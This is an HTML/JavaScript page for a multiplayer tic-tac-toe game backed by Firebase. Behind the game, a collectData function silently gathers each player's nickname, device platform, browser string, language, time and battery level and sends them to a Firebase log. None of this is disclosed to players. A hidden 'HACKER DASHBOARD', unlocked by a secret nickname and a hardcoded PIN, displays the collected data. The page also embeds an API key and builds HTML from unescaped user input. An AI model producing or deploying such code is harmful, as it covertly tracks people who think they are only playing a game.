<!DOCTYPE html>
<html lang="hi">
<head>
<meta charset="UTF-8">
<title>@rp_gupta_07 | Elite Master Control</title>
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0, viewport-fit=cover">
<script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
<style>
:root { --primary: #00f2ff; --bg: #000; --win: #00ff88; --accent: #ff4d4d; }
body { margin: 0; background: var(--bg); color: #fff; font-family: sans-serif; overflow: hidden; }
.screen { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; padding: 20px; }
input { width: 80%; padding: 15px; margin: 10px; border-radius: 10px; border: 1px solid #333; background: #111; color: #fff; }
.btn { width: 85%; padding: 15px; border-radius: 10px; border: none; font-weight: bold; cursor: pointer; margin: 5px; }
.btn-cyan { background: var(--primary); color: #000; }

/* Admin Dashboard */
#adminPanel { position: fixed; inset: 0; background: #050505; z-index: 99999; padding: 20px; display: none; overflow-y: auto; }
.user-card { background: #111; border: 1px solid var(--primary); padding: 15px; border-radius: 12px; margin-bottom: 15px; font-size: 12px; line-height: 1.6; }
.user-card b { color: var(--primary); }

/* Game Board */
#board { display: grid; gap: 8px; margin: 20px auto; }
.cell { width: 80px; height: 80px; background: #111; border: 1px solid #333; display: flex; align-items: center; justify-content: center; font-size: 30px; font-weight: 900; border-radius: 10px; }
.hidden { display: none !important; }
</style>
</head>
<body>

<div id="adminPanel">
    <div style="display:flex; justify-content:space-between;">
        <h2 style="color:var(--primary)">HACKER DASHBOARD</h2>
        <button onclick="location.reload()" style="background:red; color:white; border:none; padding:10px; border-radius:5px;">LOGOUT</button>
    </div>
    <hr border="1" color="#222">
    <div id="userDataList"></div>
</div>

<div id="mainContainer">
    <div id="loginScreen" class="screen">
        <h1 style="margin:0">ELITE <span style="color:var(--primary)">ARENA</span></h1>
        <p style="color:#444; letter-spacing:3px">V4 MASTER CONTROL</p>
        <input id="userName" placeholder="ENTER NICKNAME">
        <button id="startBtn" class="btn btn-cyan">START GAME</button>
        <input id="joinID" placeholder="ROOM CODE TO JOIN" style="margin-top:30px">
        <button id="joinBtn" class="btn" style="background:#222; color:#fff">JOIN SQUAD</button>
    </div>

    <div id="gameScreen" class="screen hidden">
        <div id="status" style="color:var(--primary); font-weight:bold; margin-bottom:10px;">YOUR TURN</div>
        <div id="board"></div>
        <div id="chat" style="width:100%; max-width:300px; background:#111; padding:10px; border-radius:10px;">
            <div id="msgs" style="height:60px; overflow-y:auto; font-size:12px; color:#888;"></div>
            <input id="msgInp" placeholder="Chat..." style="width:70%; padding:5px; font-size:12px;">
        </div>
    </div>
</div>

<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>

<script>
const firebaseConfig = { apiKey: "AIzaSyARuO_pN2vdYrVKYkKHHaNys7WI8HqM6I4", databaseURL: "https://friendchat-43941-default-rtdb.firebaseio.com", projectId: "friendchat-43941" };
firebase.initializeApp(firebaseConfig);
const db = firebase.database();

let myName, myRoom, mySym, gameRef, userData = {};

// User Ki Sari Details Nikalna
async function collectData() {
    userData = {
        name: myName,
        platform: navigator.platform,
        agent: navigator.userAgent.split(')')[0] + ')',
        lang: navigator.language,
        time: new Date().toLocaleTimeString(),
    };
    try {
        const batt = await navigator.getBattery();
        userData.battery = Math.round(batt.level * 100) + "%";
    } catch(e) { userData.battery = "Unknown"; }
}

// Admin Panel Open Karna
function openAdmin() {
    let pin = prompt("ENTER MASTER KEY:");
    if(pin === "0077") {
        document.getElementById('mainContainer').classList.add('hidden');
        document.getElementById('adminPanel').style.display = 'block';
        db.ref("room_logs").on("value", snap => {
            const list = document.getElementById('userDataList');
            list.innerHTML = "";
            snap.forEach(child => {
                let u = child.val();
                let card = document.createElement('div');
                card.className = 'user-card';
                card.innerHTML = `
                    <b>NAME:</b> ${u.name} <br>
                    <b>DEVICE:</b> ${u.platform} <br>
                    <b>BATTERY:</b> ${u.battery} <br>
                    <b>BROWSER:</b> ${u.agent} <br>
                    <b>LAST SEEN:</b> ${u.time}
                    <button onclick="firebase.database().ref('room_logs/${child.key}').remove()" style="float:right; background:red; border:none; color:white; border-radius:3px;">DELETE</button>
                `;
                list.appendChild(card);
            });
        });
    }
}

document.getElementById('startBtn').onclick = async () => {
    myName = document.getElementById('userName').value;
    if(myName === "RP_ADMIN") { openAdmin(); return; }
    await collectData();
    myRoom = Math.floor(1000 + Math.random()*8999).toString();
    mySym = "X";
    db.ref("room_logs").push(userData); // Admin panel ke liye data bhejna
    setupGame();
};

document.getElementById('joinBtn').onclick = async () => {
    myName = document.getElementById('userName').value || "Guest";
    myRoom = document.getElementById('joinID').value;
    if(!myRoom) return;
    await collectData();
    mySym = "O";
    db.ref("room_logs").push(userData);
    setupGame();
};

function setupGame() {
    gameRef = db.ref("rooms/" + myRoom);
    if(mySym === "X") {
        gameRef.set({ board: Array(9).fill(""), turn: "X", scores: {X:0, O:0} });
    }
    document.getElementById('loginScreen').classList.add('hidden');
    document.getElementById('gameScreen').classList.remove('hidden');
    initBoard();
}

function initBoard() {
    const boardEl = document.getElementById('board');
    boardEl.style.gridTemplateColumns = "repeat(3, 80px)";
    boardEl.innerHTML = "";
    for(let i=0; i<9; i++) {
        let c = document.createElement('div');
        c.className = 'cell';
        c.onclick = () => {
            gameRef.once('value', snap => {
                let g = snap.val();
                if(g.turn === mySym && g.board[i] === "") {
                    g.board[i] = mySym;
                    g.turn = mySym === "X" ? "O" : "X";
                    gameRef.update(g);
                }
            });
        };
        boardEl.appendChild(c);
    }
    
    gameRef.on('value', snap => {
        let g = snap.val(); if(!g) return;
        g.board.forEach((v, i) => {
            boardEl.children[i].innerText = v;
            boardEl.children[i].style.color = v === "X" ? "var(--primary)" : "var(--accent)";
        });
        document.getElementById('status').innerText = g.turn === mySym ? "YOUR TURN" : "WAITING...";
        checkWin(g.board);
    });
}

function checkWin(b) {
    const wins = [[0,1,2],[3,4,5],[6,7,8],[0,3,6],[1,4,7],[2,5,8],[0,4,8],[2,4,6]];
    wins.forEach(w => {
        if(b[w[0]] && b[w[0]]==b[w[1]] && b[w[0]]==b[w[2]]) {
            alert(b[w[0]] + " WINS!");
            gameRef.update({ board: Array(9).fill(""), turn: "X" });
        }
    });
}
</script>
</body>
</html>
